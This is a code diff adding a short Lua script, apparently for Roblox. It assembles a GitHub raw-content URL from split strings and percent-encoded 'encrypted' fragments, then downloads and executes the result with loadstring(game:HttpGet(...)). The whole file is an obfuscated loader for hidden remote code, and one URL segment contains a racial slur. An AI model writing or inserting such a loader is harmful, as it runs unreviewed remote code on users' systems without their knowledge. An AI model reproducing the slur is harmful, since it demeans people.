@@ -1,0 +1,12 @@
+local start = "https://raw.githubusercontent.com/"
+local author = "appealaccepted"
+local second = "/JAJAJAJA/refs/heads/main/"
+local third = "0_0_0_0_0_0_0_0_0_0_0_0_0_0_1_2_3_4_5_6_7_8_9_10_N_I_G_G_A_M_O_N_K_E_Y_APIKEY_82891092"
+local encryptedfourth = "%5C229%5C226%5C249%5C9%5C195%5C132%5C243%5C31%5C211%5C207%5C222%5C12%5C232%5C191%5C206%5C12%5C212%5C192%5C207%5C44%5C233%5C181%5C130%5C78%2C%20%5C100%5C55%5C0%5C62%5C219%5C111%5C34%5C35%5C16%5C242%5C85%5C63%5C44%5C22%5C247%5C66%5C19%5C33%5C6%5C247%5C95%5C24%5C103%5C66%5C100%5C55%5C0%5C62%5C219%5C111%5C34%5C35%5C16%5C242%5C85%5C63%5C44%5C22%5C247%5C66%5C19%5C33%5C6%5C247%5C95%5C24%5C103%5C66"
+local encryptedfifth = ""
+local madeupurl = start .. author .. second .. third
+local enycryptedsaves = {
+    [1] = "22922624991951322433121120722212232191206122121922074423318113078";
+    [2] = "10055062219111343516242856344222476619336247952410366";
+};
+loadstring(game:HttpGet(madeupurl .. encryptedfourth .. encryptedfifth .. enycryptedsaves[1] .. enycryptedsaves[2]))();
